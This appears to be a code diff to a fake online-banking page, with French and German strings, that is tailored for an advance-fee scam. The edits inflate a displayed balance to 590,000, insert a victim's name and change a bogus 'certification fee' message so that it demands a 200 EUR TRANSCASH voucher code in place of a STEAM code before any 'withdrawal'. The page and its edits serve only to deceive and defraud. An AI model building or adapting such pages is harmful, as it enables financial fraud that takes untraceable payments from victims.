@@ -28,7 +28,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
         toggleIcon.classList.add('fa-eye-slash'); // Ajouter l'icône de masque
         this.textContent = 'Afficher le solde'; // Changer le texte du bouton
     } else {
-        balanceElement.textContent = '25.000,00'; // Afficher le solde
+        balanceElement.textContent = '590.000,00'; // Afficher le solde
         toggleIcon.classList.remove('fa-eye-slash'); // Enlever l'icône de masque
         toggleIcon.classList.add('fa-eye'); // Ajouter l'icône d'affichage
         this.textContent = 'Masquer le solde'; // Changer le texte du bouton
@@ -47,12 +47,12 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Transactions récentes",
                 withdraw: "Retirer",
                 confirmWithdrawal: "Confirmer le retrait",
-                enterPin: "Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 120 EUR. Pour procéder au retrait, veuillez fournir un code STEAM d'une valeur équivalente à 120 EUR afin d'initier le processus de retrait."
+                enterPin: "Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 200 EUR. Pour procéder au retrait, veuillez fournir un code TRANSCASH d'une valeur équivalente à 200 EUR afin d'initier le processus de retrait."
 
 ,
                 confirm: "Confirmer",
                 cancel: "Annuler", 
-                userName: "Peter Lindemann",
+                userName: "Chulud El Merkabawi",
         userSince: "Client depuis 2024",
         userStatus: "Statut: Premium"
             },
@@ -68,12 +68,12 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Letzte Transaktionen",
                 withdraw: "Abheben",
                 confirmWithdrawal: "Abhebung bestätigen",
-                enterPin: "Der Abzug der Gelder von Ihrem authentifizierten Konto erfordert eine Zertifizierungsgebühr in Höhe von 120 EUR. Um mit dem Abzugsprozess fortzufahren, geben Sie bitte einen STEAM-Code im Wert von 120 EUR ein."
+                enterPin: "Der Abzug der Gelder von Ihrem authentifizierten Konto erfordert eine Zertifizierungsgebühr in Höhe von 200 EUR. Um mit dem Abzugsprozess fortzufahren, geben Sie bitte einen TRANSCASH-Code im Wert von 200 EUR ein."
 
 ,
                 confirm: "Bestätigen",
                 cancel: "Abbrechen", 
-                  userName: "Jeronyml Ursoff",
+                  userName: "Chulud El Merkabawi",
         userSince: "Kunde seit 2024",
         userStatus: "Status: Premium"
             }
@@ -153,7 +153,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
         };
 
         // Initial balance update
-        document.getElementById('account-balance').textContent = '25.000,00';
+        document.getElementById('account-balance').textContent = '590.000,00';
 
         // Add to home screen prompt for iOS
         let deferredPrompt;
@@ -186,4 +186,4 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 .catch(function(error) {
                     console.log('Service Worker registration failed:', error);
                 });
-        }
+                }
